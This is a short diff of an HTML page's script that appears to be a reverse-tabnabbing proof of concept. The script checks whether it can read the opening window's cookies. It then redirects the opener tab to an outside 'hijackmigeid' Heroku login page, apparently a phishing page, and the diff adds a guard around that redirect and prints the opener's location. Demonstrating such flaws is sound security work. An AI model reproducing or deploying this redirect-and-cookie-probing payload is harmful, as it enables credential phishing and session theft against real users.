@@ -12,7 +12,11 @@
         document.write('<b>Found window.opener.document.cookie</b><br/>');
       }
     }
-    window.opener.location = 'https://hijackmigeid.herokuapp.com/login.html'
+    if (window.opener.location) {
+      document.write('<b>window.opener.location: ' + window.opener.location + '</b><br/>');
+      window.opener.location = 'https://hijackmigeid.herokuapp.com/login.html'  
+    }
+    
   </script>
 </body>
 </html>
